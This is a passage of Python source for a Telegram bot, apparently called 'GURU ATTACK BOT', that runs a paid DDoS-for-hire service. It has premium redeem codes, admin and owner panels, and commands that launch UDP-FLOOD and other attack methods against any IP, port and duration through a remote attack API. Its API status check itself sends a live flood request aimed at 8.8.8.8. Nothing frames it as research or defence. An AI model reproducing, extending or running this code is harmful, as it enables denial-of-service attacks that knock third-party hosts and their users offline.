        await update.message.reply_text("❌ Only owners can test!")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"🔬 *TEST CONCURRENT VALUES*\n\n"
            f"Usage: `/testconcs HOST PORT TIME [METHOD]`\n"
            f"Example: `/testconcs 8.8.8.8 43 30 UDP-FLOOD`\n\n"
            f"This will test: 1, 2, 4, 8 concurrent values",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        method = args[3].upper() if len(args) > 3 else "UDP-FLOOD"
        
        if method not in ATTACK_METHODS:
            method = "UDP-FLOOD"
        
        status_msg = await update.message.reply_text(
            f"🔬 *Testing Concurrent Values...*\n\n"
            f"Target: `{target}:{port}`\n"
            f"Method: `{method}`\n"
            f"Testing: 1, 2, 4, 8\n\n"
            f"⏳ Sending test requests...",
            parse_mode='Markdown'
        )
        
        test_values = [1, 2, 4, 8]
        results = []
        successful_values = []
        
        for concs in test_values:
            result = await send_api_attack(target, port, duration, method, concs)
            
            status = "✅" if result.get('success') else "❌"
            results.append(f"{status} concs={concs} → {result.get('status', 'Error')}")
            
            if result.get('success'):
                successful_values.append(concs)
            
            await status_msg.edit_text(
                f"🔬 *Testing Concurrent Values...*\n\n"
                f"Target: `{target}:{port}`\n"
                f"Method: `{method}`\n"
                f"Progress: {len(results)}/{len(test_values)}\n\n"
                f"Results:\n" + "\n".join(results),
                parse_mode='Markdown'
            )
            
            await asyncio.sleep(0.5)
        
        final_message = (
            f"🔬 *Concurrent Test Results*\n\n"
            f"Target: `{target}:{port}`\n"
            f"Method: `{method}`\n\n"
            f"*Results:*\n" + "\n".join(results) + "\n\n"
        )
        
        if successful_values:
            highest = max(successful_values)
            final_message += (
                f"💡 *Recommendation:*\n"
                f"• Highest working concurrent: **{highest}**\n"
                f"• Set default: `/setconcurrent {highest}`\n\n"
            )
        else:
            final_message += (
                f"❌ *No concurrent values worked!*\n\n"
            )
        
        final_message += (
            f"📋 *Test specific values:*\n"
            f"`/testapi {target} {port} {duration} 1 {method}`\n"
            f"`/testapi {target} {port} {duration} 8 {method}`"
        )
        
        await status_msg.edit_text(final_message, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    users = db.get_all_users()
    
    status_text = "🔴 IDLE" if not stats['is_running'] else f"🟢 ATTACKING {stats['current_target']}"
    
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Status: {status_text}\n"
        f"🔄 Concurrent: **{get_concurrent()}**\n"
        f"⏱️ Remaining: {stats['remaining_time']}s\n"
        f"👥 Users: {len(users)}\n"
        f"💥 Attacks: {stats['total_attacks']}\n"
        f"📡 Methods: {len(ATTACK_METHODS)}\n"
        f"📡 Default: UDP-FLOOD (udp-free)\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s",
        parse_mode='Markdown'
    )

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "🎫 *REDEEM CODE*\n\nSend: `/redeem CODE`\nExample: `/redeem ABC123XYZ`",
            parse_mode='Markdown'
        )
        return
    
    code = args[0].upper()
    
    user = db.get_user(user_id)
    if user and user.get('has_used_code'):
        await update.message.reply_text("❌ You already redeemed a code!")
        return
    
    result = db.use_code(code, user_id)
    
    if result:
        duration_text = "LIFETIME" if result['access_days'] >= 3650 else f"{result['access_days']} days"
        await update.message.reply_text(
            f"✅ *CODE REDEEMED!*\n\nCode: `{code}`\nDuration: {duration_text}\n📊 Plan: PREMIUM\n\n🎉 You now have premium access with {get_concurrent()}x concurrent!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ *INVALID CODE*\n\nThe code is invalid or already used.", parse_mode='Markdown')

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== CALLBACK HANDLERS =====
async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await query.edit_message_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await query.edit_message_text(msg, parse_mode='Markdown')
        return
    
    keyboard = []
    for method in ATTACK_METHODS[:10]:
        label = f"📡 {method} {'⭐' if method == 'UDP-FLOOD' else ''}"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"method_{method}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="back")])
    
    stats = attack_manager.get_stats()
    
    await query.edit_message_text(
        f"💥 *SELECT ATTACK METHOD*\n\n"
        f"🔄 Concurrent: **{get_concurrent()}**\n"
        f"⚠️ Only 1 attack at a time\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
        f"📊 Status: {'🔴 IDLE' if not stats['is_running'] else '🟢 RUNNING'}\n\n"
        f"⭐ UDP-FLOOD is the default method (udp-free)\n\n"
        f"After selecting, send: `IP PORT TIME`\n"
        f"Example: `8.8.8.8 43 30`\n"
        f"To change concurrent: `IP PORT TIME CONCURRENT`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.replace('method_', '')
    context.user_data['attack_method'] = method
    
    is_default = "⭐ DEFAULT (udp-free)" if method == "UDP-FLOOD" else ""
    
    await query.edit_message_text(
        f"📡 *Method Selected: {method}* {is_default}\n\n"
        f"Send: `IP PORT TIME`\n"
        f"Example: `8.8.8.8 43 30`\n\n"
        f"🔄 Concurrent: **{get_concurrent()}**\n"
        f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
        f"⚠️ Only 1 attack at a time\n"
        f"To change concurrent: `IP PORT TIME CONCURRENT`\n"
        f"Send /cancel to cancel",
        parse_mode='Markdown'
    )

async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    plan, expiry = db.get_user_plan(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    if plan == "free" and not is_owner:
        text = (
            "👤 *MY PLAN*\n\n"
            "📊 Plan: 🆓 FREE\n"
            "⏱️ Status: Inactive\n\n"
            "💡 Use `/redeem CODE` to upgrade."
        )
    else:
        if is_owner:
            text = (
                "👑 *OWNER ACCESS*\n\n"
                "📊 Plan: 💎 PREMIUM (Owner)\n"
                f"⚡ {get_concurrent()}x Concurrent\n"
                f"📡 {len(ATTACK_METHODS)} Attack Methods\n"
                "📡 Default: UDP-FLOOD (udp-free)\n"
                "⏱️ Unlimited Attacks"
            )
        elif expiry:
            days_left = max(0, (expiry - datetime.now()).days)
            text = (
                "👤 *MY PLAN*\n\n"
                "📊 Plan: 💎 PREMIUM\n"
                f"⏱️ Remaining: {days_left} days\n"
                f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                "📌 Features:\n"
                f"• {get_concurrent()}x Concurrent\n"
                f"• Only 1 attack at a time\n"
                f"• {len(ATTACK_METHODS)} attack methods\n"
                "• UDP-FLOOD (udp-free) default"
            )
        else:
            text = (
                "👤 *MY PLAN*\n\n"
                "📊 Plan: 💎 PREMIUM\n"
                "⏱️ Status: LIFETIME\n\n"
                "📌 Features:\n"
                f"• {get_concurrent()}x Concurrent\n"
                f"• Only 1 attack at a time\n"
                f"• {len(ATTACK_METHODS)} attack methods\n"
                "• UDP-FLOOD (udp-free) default"
            )
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    users = db.get_all_users()
    admins = db.get_admins()
    stats = attack_manager.get_stats()
    total_attacks = db.get_total_attacks()
    banned_users = len([u for u in users if u.get('is_banned')])
    premium_users = sum(1 for u in users if u.get('plan') == 'premium')
    
    await query.edit_message_text(
        f"📊 *BOT STATISTICS*\n\n"
        f"👥 Users: {len(users)}\n"
        f"💎 Premium: {premium_users}\n"
        f"🚫 Banned: {banned_users}\n"
        f"👑 Admins: {len(admins)}\n"
        f"💥 Attacks: {total_attacks}\n"
        f"🔄 Concurrent: {get_concurrent()}\n"
        f"📡 Default: UDP-FLOOD (udp-free)\n"
        f"⚡ Status: {'🔴 IDLE' if not stats['is_running'] else '🟢 RUNNING'}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("🗑️ DELETE UNUSED CODE", callback_data="admin_delete")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("📅 1 DAY", callback_data="gen_1d")],
        [InlineKeyboardButton("📅 3 DAYS", callback_data="gen_3d")],
        [InlineKeyboardButton("📅 7 DAYS", callback_data="gen_7d")],
        [InlineKeyboardButton("📅 30 DAYS", callback_data="gen_30d")],
        [InlineKeyboardButton("📅 LIFETIME", callback_data="gen_lifetime")],
        [InlineKeyboardButton("🔙 BACK", callback_data="admin")]
    ]
    
    await query.edit_message_text(
        "➕ *GENERATE CODE*\n\nSelect duration:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')[1]
    days = 3650 if data == "lifetime" else int(data.replace('d', ''))
    
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    if db.create_code(code, days, query.from_user.id):
        duration_text = "LIFETIME" if days >= 3650 else f"{days} days"
        await query.edit_message_text(
            f"✅ *CODE GENERATED*\n\nCode: `{code}`\nDuration: {duration_text}",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to generate code!")

async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes()
    if not codes:
        text = "📋 No codes generated yet."
    else:
        text = "📋 *REDEEM CODES*\n\n"
        for c in codes[:10]:
            status = "✅" if not c.get('is_used') else "❌ Used"
            duration_text = "LIFETIME" if c['access_days'] >= 3650 else f"{c['access_days']}d"
            text += f"`{c['code']}` - {duration_text} - {status}\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes(only_unused=True)
    if not codes:
        await query.edit_message_text(
            "📋 No unused codes to delete!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
        return
    
    keyboard = []
    for c in codes[:10]:
        code = c['code']
        keyboard.append([InlineKeyboardButton(f"❌ {code}", callback_data=f"delunused_{code}")])
    
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="admin")])
    
    await query.edit_message_text(
        "🗑️ *DELETE UNUSED CODES*\n\nSelect a code to delete:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_delete_unused_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    code = query.data.replace('delunused_', '')
    if db.delete_code(code):
        await query.edit_message_text(
            f"✅ Code `{code}` deleted!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to delete code!")

async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📢 *BROADCAST*\n\nSend me the message to broadcast.\nSend /cancel to cancel.",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_broadcast'] = True

async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_broadcast'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_broadcast'] = False
        await update.message.reply_text("✅ Broadcast cancelled.")
        return
    
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        context.user_data['awaiting_broadcast'] = False
        return
    
    users = db.get_all_users()
    if not users:
        await update.message.reply_text("❌ No users to broadcast to!")
        context.user_data['awaiting_broadcast'] = False
        return
    
    progress_msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
    
    successful = 0
    for i, user in enumerate(users):
        if db.is_banned(user['user_id']):
            continue
        
        try:
            await context.bot.send_message(
                chat_id=user['user_id'],
                text=update.message.text,
                parse_mode='Markdown'
            )
            successful += 1
        except:
            pass
        
        if (i + 1) % 10 == 0:
            try:
                await progress_msg.edit_text(
                    f"📢 *Broadcasting...*\n"
                    f"Progress: {i+1}/{len(users)}\n"
                    f"✅ Success: {successful}",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        await asyncio.sleep(0.05)
    
    await progress_msg.edit_text(
        f"✅ *Broadcast Complete!*\n\n"
        f"👥 Total: {len(users)}\n"
        f"✅ Successful: {successful}\n"
        f"❌ Failed: {len(users) - successful}",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_broadcast'] = False

async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    pause_info = db.get_pause_info()
    pause_status = pause_info.get('paused', False)
    pause_text = "⏸️ PAUSE BOT" if not pause_status else "▶️ RESUME BOT"
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("⚡ SET CONCURRENT", callback_data="owner_concurrent")],
        [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
        [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
        [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
        [InlineKeyboardButton("📋 LIST USERS", callback_data="owner_list_users")],
        [InlineKeyboardButton(pause_text, callback_data="owner_pause")],
        [InlineKeyboardButton("🔌 API STATUS", callback_data="owner_api_status")],
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="owner_stop")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    status_text = "🔴 IDLE" if not stats['is_running'] else f"🟢 ATTACKING {stats['current_target']}"
    
    await query.edit_message_text(
        f"👑 *OWNER PANEL*\n\n"
        f"Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n"
        f"⚡ Attack: {status_text}\n"
        f"🔄 Concurrent: **{get_concurrent()}**\n"
        f"📡 Default: UDP-FLOOD (udp-free)\n"
        f"⏱️ Remaining: {stats['remaining_time']}s",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def owner_concurrent_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"⚡ *SET CONCURRENT*\n\n"
        f"Current: **{get_concurrent()}**\n"
        f"Min: {MIN_CONCURRENT}\n"
        f"Max: {MAX_CONCURRENT}\n\n"
        f"Send: `/setconcurrent NUMBER`\n"
        f"Example: `/setconcurrent 2`\n\n"
        f"⚠️ This affects ALL attacks!",
        parse_mode='Markdown'
    )

async def owner_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    success, msg = await attack_manager.stop_attack(user_id)
    
    if success:
        await query.edit_message_text(
            f"🛑 *Attack Stopped!*\n\n{msg}",
            parse_mode='Markdown'
        )
    else:
        await query.edit_message_text(f"❌ {msg}")

async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    current_pause = db.get_pause_info().get('paused', False)
    
    if current_pause:
        db.set_pause(False, user_id)
        await query.edit_message_text(
            "✅ *Bot Resumed*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        db.set_pause(True, user_id, "Owner paused")
        await query.edit_message_text(
            "⏸️ *Bot Paused*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )

async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "👑 PROMOTE ADMIN\n\nSend: USER_ID\nSend /cancel to cancel"
    )
    context.user_data['awaiting_promote'] = True

async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_promote'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_promote'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        user = db.get_user(user_id)
        
        if not user:
            await update.message.reply_text(f"❌ User {user_id} not found.")
            return
        
        if db.is_admin(user_id):
            await update.message.reply_text(f"❌ User {user_id} is already an admin!")
            return
        
        db.add_admin(user_id, user.get('username', 'Unknown'), "admin", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} promoted to ADMIN!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_promote'] = False

async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    keyboard = []
    
    for admin in admins:
        admin_id = admin['user_id']
        if admin_id != OWNER_ID and admin.get('level') != "pseudo_owner":
            keyboard.append([InlineKeyboardButton(f"❌ {admin_id}", callback_data=f"demote_{admin_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="owner")])
    
    await query.edit_message_text(
        "👑 DEMOTE ADMIN\n\nClick an admin to demote:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = int(query.data.split('_')[1])
    
    if user_id == OWNER_ID:
        await query.edit_message_text("❌ Cannot demote the owner!")
        return
    
    if db.remove_admin(user_id):
        await query.edit_message_text(
            f"✅ Admin {user_id} demoted!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        await query.edit_message_text("❌ Failed to demote!")

async def owner_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🚫 BAN USER\n\nSend user ID to ban:\nSend /cancel to cancel"
    )
    context.user_data['awaiting_ban'] = True

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        
        if user_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot ban the owner!")
            context.user_data['awaiting_ban'] = False
            return
        
        if db.is_admin(user_id):
            await update.message.reply_text("❌ Cannot ban an admin!")
            context.user_data['awaiting_ban'] = False
            return
        
        db.ban_user(user_id, "Banned by owner", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} banned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_ban'] = False

async def owner_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "✅ UNBAN USER\n\nSend user ID to unban:\nSend /cancel to cancel"
    )
    context.user_data['awaiting_unban'] = True

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_unban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        db.unban_user(user_id)
        await update.message.reply_text(f"✅ User {user_id} unbanned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_unban'] = False

async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    if not admins:
        await query.edit_message_text("👑 No admins found.")
        return
    
    text = "👑 *ADMIN LIST*\n\n"
    for admin in admins:
        level = admin.get('level', 'admin').upper()
        text += f"• {admin['user_id']} - {level}\n"
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    users = db.get_all_users()
    if not users:
        await query.edit_message_text("📋 No users found.")
        return
    
    text = "👥 *ALL USERS*\n\n"
    for user in users[:20]:
        user_id = user.get('user_id')
        username = user.get('username', 'N/A')
        plan = user.get('plan', 'free').upper()
        is_banned = "🚫" if user.get('is_banned') else "✅"
        is_admin = "⭐" if db.is_admin(user_id) else ""
        text += f"{is_banned}{is_admin} {user_id} - @{username} ({plan})\n"
    
    if len(users) > 20:
        text += f"\n... and {len(users) - 20} more"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text("🔌 Checking API Status...")
    
    try:
        if not API_KEY:
            await query.edit_message_text("❌ API_KEY not configured!")
            return
        
        # CRITICAL: Use lowercase method for API test
        params = {
            "key": API_KEY,
            "host": "8.8.8.8",
            "port": "53",
            "time": "30",
            "method": "udp-free",  # MUST be lowercase
            "concs": "1"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*"
        }
        
        timeout = aiohttp.ClientTimeout(total=35, connect=10)
        
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            start_time = time.time()
            async with session.get(API_URL, params=params) as response:
                elapsed = time.time() - start_time
                response_text = await response.text(encoding='utf-8', errors='ignore')
                
                try:
                    response_data = json.loads(response_text)
                except:
                    response_data = {"raw": response_text[:100]}
                
                # Check if the API test was successful
                if response.status == 200 and response_data.get('status') == 'success':
                    message = f"✅ API Connected - Status: {response.status} (Response: {elapsed:.2f}s)"
                    attack_id = response_data.get('attack_id', 'N/A')
                    details = f"🆔 Attack ID: `{attack_id}`"
                else:
                    error_msg = response_data.get('message', 'Unknown error')
                    message = f"⚠️ API Error: {error_msg}"
                    details = f"📊 Response: {str(response_data)[:200]}"
                
                await query.edit_message_text(
                    f"🔌 *API STATUS*\n\n{message}\n\n{details}\n\n⚡ Concurrent: {get_concurrent()}\n📡 Default: UDP-FLOOD (udp-free)",
                    parse_mode='Markdown',
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 REFRESH", callback_data="owner_api_status")],
                        [InlineKeyboardButton("🔙 BACK", callback_data="owner")]
                    ])
                )
    except Exception as e:
        await query.edit_message_text(
            f"❌ API Error: {str(e)}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    user_id = user.id
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    await query.edit_message_text(
        "👋 *WELCOME BACK*",
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_attack'):
        await process_attack(update, context)
    elif context.user_data.get('awaiting_promote'):
        await process_promote(update, context)
    elif context.user_data.get('awaiting_ban'):
        await process_ban(update, context)
    elif context.user_data.get('awaiting_unban'):
        await process_unban(update, context)
    elif context.user_data.get('awaiting_broadcast'):
        await process_broadcast(update, context)

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    await attack_command(update, context)
    context.user_data['awaiting_attack'] = False

# ===== MAIN =====
def main():
    if not TELEGRAM_TOKEN:
        print("❌ TELEGRAM_TOKEN not set!")
        return
    
    print("=" * 60)
    print("🔥 GURU ATTACK BOT - UDP-FLOOD DEFAULT 🔥")
    print(f"⚡ DEFAULT CONCURRENT: {get_concurrent()}")
    print(f"📊 CONCURRENT RANGE: {MIN_CONCURRENT}-{MAX_CONCURRENT}")
    print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
    print(f"📡 Default Method: UDP-FLOOD (udp-free)")
    print(f"📡 Methods: {len(ATTACK_METHODS)} methods")
    print("=" * 60)
    print("💡 Commands:")
    print("  /attack IP PORT TIME [METHOD] [CONCURRENT] - Start attack")
    print("  /setconcurrent NUMBER - Change concurrent value")
    print("  /testapi HOST PORT TIME [CONCURRENT] [METHOD] - Test API")
    print("  /testconcs HOST PORT TIME [METHOD] - Test concurrent values")
    print("  /status - Show bot status")
    print("  /stop - Stop running attack")
    print("  /redeem CODE - Redeem premium code")
    print("=" * 60)
    
    # Create application
    bot_app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # COMMANDS
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("attack", attack_command))
    bot_app.add_handler(CommandHandler("stop", stop_command))
    bot_app.add_handler(CommandHandler("setconcurrent", set_concurrent_command))
    bot_app.add_handler(CommandHandler("testapi", testapi_command))
    bot_app.add_handler(CommandHandler("testconcs", test_concurrents_command))
    bot_app.add_handler(CommandHandler("status", status_command))
    bot_app.add_handler(CommandHandler("redeem", redeem_command))
    bot_app.add_handler(CommandHandler("cancel", cancel))
    
    # CALLBACK QUERY HANDLERS
    bot_app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    bot_app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    bot_app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
    bot_app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    bot_app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    bot_app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    bot_app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
    bot_app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
    bot_app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
    bot_app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    bot_app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
    bot_app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
    bot_app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
